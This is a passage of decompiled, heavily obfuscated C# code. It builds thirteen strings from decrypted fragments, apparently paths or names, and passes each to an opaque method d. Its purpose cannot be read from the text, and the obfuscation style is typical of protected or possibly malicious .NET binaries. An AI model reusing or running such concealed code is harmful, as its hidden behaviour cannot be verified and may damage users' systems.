		string string_5 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 69146), (int)((nint)Type.EmptyTypes.LongLength + 72073), 46);
		string string_6 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c(6399, (int)((nint)Type.EmptyTypes.LongLength + 5227), sizeof(ushort) + 211);
		string string_7 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c(((0x201BDA ^ ((uint)p % 256u)) == 0) ? 1192468771 : 41733, 44840, (int)((nint)Type.EmptyTypes.LongLength + 175));
		string string_8 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 66831), (int)((nint)Type.EmptyTypes.LongLength + 69905), (int)((~((-3922 + (num << 22)) * 16384) == (int)((uint)num / 256u)) ? ((nint)Type.EmptyTypes.LongLength + -1809354737) : (sizeof(uint) + 243)));
		string string_9 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 31584), 30395, sizeof(ulong) + 178);
		string string_10 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c((int)((449 * p + 575 * p - 1550 == -9547) ? (sizeof(Guid) + -1326156391) : ((-1193793768 + p - -4629 != p - 1412) ? (sizeof(ulong) + -108) : ((nint)Type.EmptyTypes.LongLength + 1735959329))), 2684, (int)((nint)Type.EmptyTypes.LongLength + 42));
		string string_11 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c((int)((nint)Type.EmptyTypes.LongLength + 46021), 49196, (int)((nint)Type.EmptyTypes.LongLength + 200));
		string text4 = global::b.m_c;
		string text5 = global::b.m_a;
		nint num4 = (nint)Type.EmptyTypes.LongLength + 11949;
		int num5 = _003CModule_003E.l;
		string string_12 = text4 + text + text5 + _003CModule_003E.c((int)num4, (int)((((num5 + 8200) & 4) == (4 & (num5 | (-num5 * -36061184)))) ? (sizeof(ulong) + 15151) : (((p + (p - 5090) << 29) + 536870912 != (int)((uint)p >> 3)) ? ((nint)Type.EmptyTypes.LongLength + -200719798) : (sizeof(ulong) + 769622373))), (int)((nint)Type.EmptyTypes.LongLength + 128));
		string string_13 = global::b.m_c + text + global::b.m_a + _003CModule_003E.c(sizeof(double) + 44535, (int)(((0x3FFFE381 & (p * 796288 << 23)) == 0) ? ((nint)Type.EmptyTypes.LongLength + 47816) : (-749840561)), (((uint)((num << 15) + -3174) >> 1) - 217120 != (uint)(num << 7)) ? (sizeof(long) + 63) : (sizeof(short) + -1695389128));
		d(string_, string_0);
		d(string_2, string_0);
		d(string_3, string_0);
		d(string_4, string_0);
		d(string_5, string_0);
		d(string_6, string_0);
		d(string_7, string_0);
		d(string_8, string_0);
		d(string_9, string_0);
		d(string_10, string_0);
		d(string_11, string_0);
		d(string_12, string_0);
		d(string_13, string_0);
		m.a = string_4;
	}
}
